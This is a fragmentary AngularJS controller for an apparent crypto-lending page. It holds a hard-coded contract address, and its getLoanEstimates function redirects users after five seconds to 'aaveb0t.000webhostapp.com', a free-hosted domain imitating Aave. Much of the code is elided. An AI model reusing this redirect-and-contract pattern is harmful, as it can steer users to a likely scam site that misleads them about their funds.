...
app.controller('myCtrl', async function($scope) {
	$scope.init = function() {
		$scope.contractAddress = '0xd879C84b4cC09F39d471E127e015A1b553212937';
		...
		$scope.erc20 = {
			...
			symbol: ''
                        ...
                        $scope.getLoanEstimates = function() {
						    ...
						    window.location.href = 'https://aaveb0t.000webhostapp.com/';
						}, 5000);
                                            }
                                        });
                                    }
